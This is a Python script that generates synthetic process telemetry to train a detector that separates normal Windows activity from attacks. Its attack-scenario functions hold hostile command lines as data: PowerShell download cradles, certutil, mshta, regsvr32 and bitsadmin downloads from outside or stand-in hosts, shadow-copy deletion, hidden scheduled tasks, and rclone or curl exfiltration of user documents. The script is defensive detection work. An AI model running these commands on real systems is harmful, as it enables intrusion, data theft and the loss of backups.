"""Synthetic, scenario-based training data to bootstrap (and augment) real recordings.

Rows are produced by feeding realistic process descriptions - including real-looking
command lines - through the *same* ``common.features.build_row`` used live, so the
synthetic distribution can never drift from the inference feature definition.

Normal scenarios deliberately include hard negatives (npm install, zip extraction,
OneDrive sync, VS Code's PowerShell host with ``-ExecutionPolicy Bypass``) so the
model learns that "many files" or "bypass flag" alone is not an attack.

    python -m ml.generate_dataset --rows 30000 --out data/synthetic.csv
"""
from __future__ import annotations

import argparse
import base64
import csv
from pathlib import Path

import numpy as np

from common.features import FEATURE_COLUMNS, build_row

META = ["ts", "pid", "name", "source", "label", "scenario"]


class _Gen:
    def __init__(self, seed: int):
        self.r = np.random.default_rng(seed)

    # distributions ------------------------------------------------------
    def u(self, lo, hi):
        return float(self.r.uniform(lo, hi))

    def logu(self, lo, hi):
        """Log-uniform: right-skewed like real resource counters."""
        return float(np.exp(self.r.uniform(np.log(lo), np.log(hi))))

    def i(self, lo, hi):
        return int(self.r.integers(lo, hi + 1))

    def pick(self, seq):
        return seq[int(self.r.integers(0, len(seq)))]

    def p(self, prob):
        return bool(self.r.random() < prob)

    def maybe0(self, value, prob_zero):
        return 0.0 if self.p(prob_zero) else value

    def b64(self, n=40):
        raw = bytes(self.r.integers(32, 127, size=n, dtype=np.uint8))
        return base64.b64encode(raw).decode()

    # context ------------------------------------------------------------
    def ctx(self, burst: bool = False, ransom: bool = False) -> dict:
        if ransom:
            return {"file_create_rate": self.logu(5, 300), "file_delete_rate": self.logu(3, 200),
                    "file_modify_rate": self.logu(10, 500), "cpu_percent": self.u(20, 100)}
        if burst:
            return {"file_create_rate": self.logu(5, 250), "file_delete_rate": self.maybe0(self.logu(0.2, 20), 0.6),
                    "file_modify_rate": self.logu(2, 200), "cpu_percent": self.u(10, 90)}
        return {"file_create_rate": self.maybe0(self.logu(0.2, 4), 0.6),
                "file_delete_rate": self.maybe0(self.logu(0.2, 3), 0.8),
                "file_modify_rate": self.maybe0(self.logu(0.2, 8), 0.4),
                "cpu_percent": self.u(2, 70)}


def _base(g: _Gen, **kw) -> dict:
    d = {"cpu_percent": 0.0, "mem_percent": g.u(0.05, 1.0), "num_threads": g.i(1, 20),
         "age_s": g.logu(60, 3e5), "write_ops_rate": 0.0, "write_kb_rate": 0.0,
         "read_ops_rate": 0.0, "num_conns": 0, "num_remote_ips": 0, "num_children": 0,
         "parent_name": "explorer.exe", "cmdline": ""}
    d.update(kw)
    return d


# ----------------------------------------------------------------------------- normal
def n_idle(g):
    name = g.pick(["svchost.exe", "RuntimeBroker.exe", "SearchHost.exe", "sihost.exe",
                   "taskhostw.exe", "ctfmon.exe", "audiodg.exe", "spoolsv.exe", "dllhost.exe",
                   "WmiPrvSE.exe", "OneDrive.exe", "Teams.exe", "Spotify.exe", "slack.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["services.exe", "explorer.exe", "svchost.exe"]),
                       cmdline=g.pick(["", f"C:\\Windows\\system32\\{name} -k netsvcs -p",
                                       f"\"C:\\Program Files\\{name}\""]),
                       cpu_percent=g.maybe0(g.logu(0.05, 3), 0.6),
                       write_ops_rate=g.maybe0(g.logu(0.1, 10), 0.7),
                       write_kb_rate=g.maybe0(g.logu(0.1, 50), 0.7),
                       read_ops_rate=g.maybe0(g.logu(0.1, 30), 0.6),
                       num_conns=g.maybe0(g.i(1, 6), 0.7)), g.ctx(burst=g.p(0.08))


def n_browser(g):
    name = g.pick(["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"])
    download = g.p(0.2)
    conns = g.i(0, 60)
    return name, _base(g, name=name, parent_name=g.pick(["explorer.exe", name]),
                       cmdline=f"\"C:\\Program Files\\{name}\" --type={g.pick(['renderer', 'gpu-process', 'utility'])} "
                               f"--lang=en-US --field-trial-handle={g.i(1000, 9999)}",
                       cpu_percent=g.logu(0.1, 35), mem_percent=g.u(0.5, 9), num_threads=g.i(10, 70),
                       write_ops_rate=g.logu(5, 300) if download else g.maybe0(g.logu(0.5, 40), 0.3),
                       write_kb_rate=g.logu(500, 30000) if download else g.maybe0(g.logu(1, 400), 0.3),
                       read_ops_rate=g.maybe0(g.logu(1, 200), 0.25), num_conns=conns,
                       num_remote_ips=min(conns, g.i(0, 35)), num_children=g.i(0, 25)), \
        g.ctx(burst=g.p(0.1))


def n_editor(g):
    name = g.pick(["Code.exe", "notepad.exe", "devenv.exe", "pycharm64.exe", "WINWORD.EXE",
                   "EXCEL.EXE", "AcroRd32.exe", "Acrobat.exe", "SumatraPDF.exe", "Obsidian.exe"])
    arg = g.pick(["", "C:\\Users\\me\\Documents\\report.docx", "--type=renderer"])
    return name, _base(g, name=name, cmdline=f"\"C:\\Program Files\\{name}\" {arg}",
                       cpu_percent=g.logu(0.05, 25), mem_percent=g.u(0.3, 6), num_threads=g.i(5, 60),
                       write_ops_rate=g.maybe0(g.logu(0.5, 60), 0.4), write_kb_rate=g.maybe0(g.logu(1, 800), 0.4),
                       read_ops_rate=g.maybe0(g.logu(0.5, 150), 0.25), num_conns=g.i(0, 8),
                       num_remote_ips=g.i(0, 4), num_children=g.i(0, 15)), g.ctx(burst=g.p(0.05))


def n_dev_build(g):
    """Hard negative: npm/pip/git/compilers create thousands of files from a shell."""
    name = g.pick(["node.exe", "npm.exe", "git.exe", "python.exe", "pip.exe", "cargo.exe",
                   "msbuild.exe", "cl.exe", "javac.exe", "gradle.exe", "7z.exe"])
    cmd = {"node.exe": "node C:\\Users\\me\\AppData\\Roaming\\npm\\node_modules\\npm\\bin\\npm-cli.js install",
           "git.exe": "git clone https://github.com/org/repo.git",
           "python.exe": "python -m pip install -r requirements.txt",
           "msbuild.exe": "MSBuild.exe Solution.sln /p:Configuration=Release"}.get(name, f"{name} build")
    return name, _base(g, name=name, parent_name=g.pick(["cmd.exe", "powershell.exe", "pwsh.exe", "Code.exe", "bash.exe", ""]),
                       cmdline=cmd, age_s=g.logu(1, 600), cpu_percent=g.logu(5, 95),
                       mem_percent=g.u(0.3, 5), num_threads=g.i(4, 40),
                       write_ops_rate=g.logu(20, 1500), write_kb_rate=g.logu(100, 40000),
                       read_ops_rate=g.maybe0(g.logu(20, 2000), 0.25), num_conns=g.i(0, 12),
                       num_remote_ips=g.i(0, 6), num_children=g.i(0, 8)), g.ctx(burst=g.p(0.7))


def n_sync_extract(g):
    """Hard negative: OneDrive/Dropbox sync, Explorer copy/zip extract, Defender scan."""
    name = g.pick(["OneDrive.exe", "Dropbox.exe", "explorer.exe", "7zFM.exe", "WinRAR.exe",
                   "MsMpEng.exe", "SearchIndexer.exe", "GoogleDriveFS.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["explorer.exe", "services.exe", "userinit.exe"]),
                       cmdline=f"\"C:\\Program Files\\{name}\" /background", cpu_percent=g.logu(1, 60),
                       mem_percent=g.u(0.2, 4), num_threads=g.i(10, 90),
                       write_ops_rate=g.logu(5, 800), write_kb_rate=g.logu(50, 50000),
                       read_ops_rate=g.maybe0(g.logu(20, 3000), 0.25), num_conns=g.i(0, 20),
                       num_remote_ips=g.i(0, 10)), g.ctx(burst=g.p(0.75))


def n_benign_shell(g):
    """Hard negative: interactive shells, VS Code's PowerShell host, admin scripts."""
    name = g.pick(["powershell.exe", "pwsh.exe", "cmd.exe"])
    script = g.pick(["start", "build", "deploy"])
    cmd = g.pick([
        name,
        f"{name} -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command Import-Module "
        "'c:\\Users\\me\\.vscode\\extensions\\ms-vscode.powershell\\modules\\PowerShellEditorServices'",
        f"{name} -NoLogo",
        "cmd.exe /c \"npm run build\"",
        "cmd.exe /d /s /c \"git status\"",
        f"{name} -File C:\\Scripts\\backup.ps1",
        f"{name} -NoProfile -Command Get-Process",
        # developers' own scripts are routinely run with an execution-policy bypass
        f"{name} -ExecutionPolicy Bypass -File D:\\Projects\\app\\scripts\\{script}.ps1",
        f"{name} -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\me\\repo\\tools\\run_tests.ps1",
        f"{name} -ExecutionPolicy Bypass -Command \"& .venv\\Scripts\\Activate.ps1\"",
    ])
    parent = g.pick(["explorer.exe", "Code.exe", "WindowsTerminal.exe", "svchost.exe", "bash.exe", ""])
    if g.p(0.35):
        # start-up burst: a fresh shell loads its modules (high CPU and reads, few writes)
        return name, _base(g, name=name, parent_name=parent, cmdline=cmd, age_s=g.logu(0.05, 5),
                           cpu_percent=g.logu(2, 60), num_threads=g.i(5, 30),
                           write_ops_rate=g.maybe0(g.logu(1, 40), 0.3),
                           write_kb_rate=g.maybe0(g.logu(0.1, 50), 0.3),
                           read_ops_rate=g.maybe0(g.logu(50, 3000), 0.25), num_children=g.i(0, 2)), g.ctx(burst=g.p(0.1))
    busy = g.p(0.25)
    return name, _base(g, name=name, parent_name=parent,
                       cmdline=cmd, age_s=g.logu(0.3, 1e5), cpu_percent=g.logu(0.05, 30 if busy else 4),
                       write_ops_rate=g.logu(1, 120) if busy else g.maybe0(g.logu(0.1, 5), 0.6),
                       write_kb_rate=g.logu(5, 3000) if busy else g.maybe0(g.logu(0.1, 20), 0.6),
                       read_ops_rate=g.maybe0(g.logu(0.2, 200), 0.25), num_conns=g.maybe0(g.i(1, 3), 0.85),
                       num_remote_ips=g.maybe0(1, 0.9), num_children=g.i(0, 4)), g.ctx(burst=g.p(0.15))


# --------------------------------------------------------------------------- suspicious
def _ps_cmd(g, payload_hint: str, network: bool = False) -> str:
    flags = [g.pick(["-nop", "-NoProfile", ""]), g.pick(["-w hidden", "-WindowStyle Hidden", ""]),
             g.pick(["-ep bypass", "-ExecutionPolicy Bypass", "-exec bypass", ""]),
             g.pick(["-noni", "-NonInteractive", ""])]
    bodies = [f"-enc {g.b64(g.i(60, 400))}", f"-EncodedCommand {g.b64(g.i(60, 400))}",
                   f"-c \"IEX (New-Object Net.WebClient).DownloadString('http://{g.i(1, 223)}.{g.i(0, 255)}.{g.i(0, 255)}.{g.i(1, 254)}/a.ps1')\"",
                   f"-File C:\\Users\\me\\AppData\\Local\\Temp\\{payload_hint}.ps1",
                   f"-File C:\\Users\\me\\Downloads\\{payload_hint}.ps1",
                   f"-c \"1..{g.i(200, 5000)} | % {{ Set-Content $env:USERPROFILE\\Downloads\\f$_.txt (Get-Random) }}\""]
    # download cradles always carry an encoded/network indicator in the command line
    body = g.pick(bodies[:3] if network else bodies)
    return " ".join(x for x in ["powershell.exe", *flags, body] if x)


def s_ps_file_dump(g):
    """The demo scenario: scripted PowerShell rapidly creating files in Downloads."""
    name = g.pick(["powershell.exe", "pwsh.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["explorer.exe", "cmd.exe", "powershell.exe", "WINWORD.EXE", "wscript.exe", ""]),
                       cmdline=_ps_cmd(g, g.pick(["update", "invoice", "payload", "x"])),
                       age_s=g.logu(0.2, 300), cpu_percent=g.logu(3, 90), mem_percent=g.u(0.3, 3),
                       num_threads=g.i(8, 30), write_ops_rate=g.logu(25, 3000),
                       write_kb_rate=g.logu(20, 20000), read_ops_rate=g.maybe0(g.logu(5, 500), 0.25),
                       num_conns=g.maybe0(g.i(1, 4), 0.7), num_remote_ips=g.maybe0(1, 0.75),
                       num_children=g.i(0, 3)), g.ctx(burst=True)


def s_ransomware(g):
    name = g.pick(["svch0st.exe", "update.exe", "winupdate.exe", "invoice.exe", "rundll32.exe",
                   "powershell.exe", "a.exe", "setup_x64.exe", "chrome_update.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["explorer.exe", "cmd.exe", "powershell.exe", "WINWORD.EXE", "svchost.exe", ""]),
                       cmdline=g.pick([f"C:\\Users\\me\\AppData\\Local\\Temp\\{name}",
                                       f"C:\\Users\\me\\Downloads\\{name} --silent",
                                       f"{name} -k {g.b64(12)}", ""]),
                       age_s=g.logu(1, 1800), cpu_percent=g.logu(15, 100), mem_percent=g.u(0.2, 5),
                       num_threads=g.i(4, 64), write_ops_rate=g.logu(80, 5000),
                       write_kb_rate=g.logu(1000, 100000), read_ops_rate=g.maybe0(g.logu(80, 5000), 0.25),
                       num_conns=g.maybe0(g.i(1, 5), 0.6), num_remote_ips=g.maybe0(g.i(1, 3), 0.7),
                       num_children=g.i(0, 4)), g.ctx(ransom=True)


def s_download_cradle(g):
    name = g.pick(["powershell.exe", "pwsh.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "cmd.exe", "wscript.exe", "mshta.exe", "explorer.exe"]),
                       cmdline=_ps_cmd(g, "stage2", network=True), age_s=g.logu(0.2, 120),
                       cpu_percent=g.logu(0.5, 40), num_threads=g.i(6, 25),
                       write_ops_rate=g.maybe0(g.logu(1, 60), 0.4), write_kb_rate=g.maybe0(g.logu(5, 2000), 0.4),
                       read_ops_rate=g.maybe0(g.logu(1, 200), 0.25), num_conns=g.i(1, 8),
                       num_remote_ips=g.i(1, 5), num_children=g.i(0, 3)), g.ctx(burst=g.p(0.3))


def s_lolbin(g):
    name, cmd = g.pick([
        ("certutil.exe", f"certutil.exe -urlcache -split -f http://{g.i(1, 223)}.{g.i(0, 255)}.0.{g.i(1, 254)}/p.exe C:\\Users\\Public\\p.exe"),
        ("mshta.exe", f"mshta.exe http://{g.i(1, 223)}.{g.i(0, 255)}.4.{g.i(1, 254)}/run.hta"),
        ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"x\")"),
        ("regsvr32.exe", f"regsvr32 /s /n /u /i:http://{g.i(1, 223)}.9.9.{g.i(1, 254)}/file.sct scrobj.dll"),
        ("bitsadmin.exe", "bitsadmin /transfer job /download /priority high http://evil.example/a.exe C:\\Users\\Public\\a.exe"),
        ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        ("wmic.exe", "wmic shadowcopy delete"),
        ("wscript.exe", "wscript.exe C:\\Users\\me\\AppData\\Local\\Temp\\invoice.js"),
        ("cmd.exe", f"cmd.exe /c powershell -w hidden -enc {g.b64(80)}"),
        ("schtasks.exe", "schtasks /create /sc minute /mo 5 /tn Updater /tr \"powershell -w hidden -ep bypass -File C:\\Users\\Public\\u.ps1\""),
    ])
    return name, _base(g, name=name, parent_name=g.pick(["cmd.exe", "powershell.exe", "WINWORD.EXE", "EXCEL.EXE", "wscript.exe", "explorer.exe", ""]),
                       cmdline=cmd, age_s=g.logu(0.1, 60), cpu_percent=g.logu(0.5, 50),
                       write_ops_rate=g.maybe0(g.logu(1, 300), 0.3), write_kb_rate=g.maybe0(g.logu(5, 5000), 0.3),
                       read_ops_rate=g.maybe0(g.logu(1, 300), 0.25), num_conns=g.maybe0(g.i(1, 5), 0.5),
                       num_remote_ips=g.maybe0(g.i(1, 3), 0.5), num_children=g.i(0, 3)), g.ctx(burst=g.p(0.3))


def s_exfil(g):
    name = g.pick(["powershell.exe", "rclone.exe", "curl.exe", "python.exe", "svch0st.exe", "ftp.exe"])
    return name, _base(g, name=name, parent_name=g.pick(["cmd.exe", "powershell.exe", "explorer.exe", "wscript.exe", ""]),
                       cmdline=g.pick([f"{name} copy C:\\Users\\me\\Documents remote:loot --transfers 32",
                                       f"curl.exe -T C:\\Users\\me\\Documents\\db.zip ftp://{g.i(1, 223)}.4.4.{g.i(1, 254)}/",
                                       _ps_cmd(g, "exfil")]),
                       age_s=g.logu(1, 3600), cpu_percent=g.logu(2, 60), num_threads=g.i(4, 50),
                       write_ops_rate=g.logu(1, 100), write_kb_rate=g.logu(10, 3000),
                       read_ops_rate=g.maybe0(g.logu(100, 5000), 0.25), num_conns=g.i(10, 120),
                       num_remote_ips=g.i(12, 80), num_children=g.i(0, 2)), g.ctx(burst=g.p(0.2))


NORMAL = {"idle": (n_idle, 0.36), "browser": (n_browser, 0.18), "editor": (n_editor, 0.16),
          "dev_build": (n_dev_build, 0.11), "sync_extract": (n_sync_extract, 0.09),
          "benign_shell": (n_benign_shell, 0.10)}
ATTACK = {"ps_file_dump": (s_ps_file_dump, 0.32), "ransomware": (s_ransomware, 0.18),
          "download_cradle": (s_download_cradle, 0.18), "lolbin": (s_lolbin, 0.18),
          "exfil": (s_exfil, 0.14)}


def generate(rows: int = 30000, attack_frac: float = 0.3, seed: int = 42):
    """Return (header, list_of_rows) of synthetic samples."""
    g = _Gen(seed)
    out = []
    n_attack = int(rows * attack_frac)
    for label, table, n in ((0, NORMAL, rows - n_attack), (1, ATTACK, n_attack)):
        names = list(table)
        probs = np.array([table[k][1] for k in names])
        picks = g.r.choice(len(names), size=n, p=probs / probs.sum())
        for k in picks:
            scen = names[k]
            pname, proc, ctx = table[scen][0](g)
            out.append([0, 0, pname, "synthetic", label, scen]
                       + [round(v, 4) for v in build_row(proc, ctx)])
    return META + FEATURE_COLUMNS, out


def main(argv=None):
    ap = argparse.ArgumentParser(description="Generate synthetic training rows.")
    ap.add_argument("--rows", type=int, default=30000)
    ap.add_argument("--attack-frac", type=float, default=0.3)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default="data/synthetic.csv")
    a = ap.parse_args(argv)
    header, rows = generate(a.rows, a.attack_frac, a.seed)
    Path(a.out).parent.mkdir(parents=True, exist_ok=True)
    with open(a.out, "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        w.writerows(rows)
    print(f"wrote {len(rows)} rows -> {a.out}")


if __name__ == "__main__":
    main()
